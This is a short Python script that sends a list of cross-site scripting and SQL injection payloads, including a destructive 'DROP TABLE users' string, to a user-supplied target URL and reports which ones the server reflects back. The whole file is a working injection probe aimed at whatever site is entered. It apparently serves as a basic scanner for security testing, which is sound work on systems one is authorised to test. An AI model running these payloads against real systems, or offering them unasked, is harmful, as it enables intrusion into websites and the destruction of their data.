import requests

payloads = [
    "<script>alert(1)</script>",
    "' OR '1'='1",
    "<img src=x onerror=alert(1)>",
    "'; DROP TABLE users; --",
    "' OR 1=1--",
    "\" onmouseover=alert(1) x=\"",
]

def inject_payloads(url, param="test"):
    print(f"Target URL: {url}")
    for payload in payloads:
        injected_url = url.replace(param, payload)
        try:
            print(f"[*] Trying payload: {payload}")
            r = requests.get(injected_url, timeout=5)
            if payload in r.text:
                print(f"[+] Payload reflected! Possible issue: {payload}")
            else:
                print("[-] Not reflected.")
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    target = input("Enter target URL (replace 'test' with your parameter):\n> ")
    inject_payloads(target)
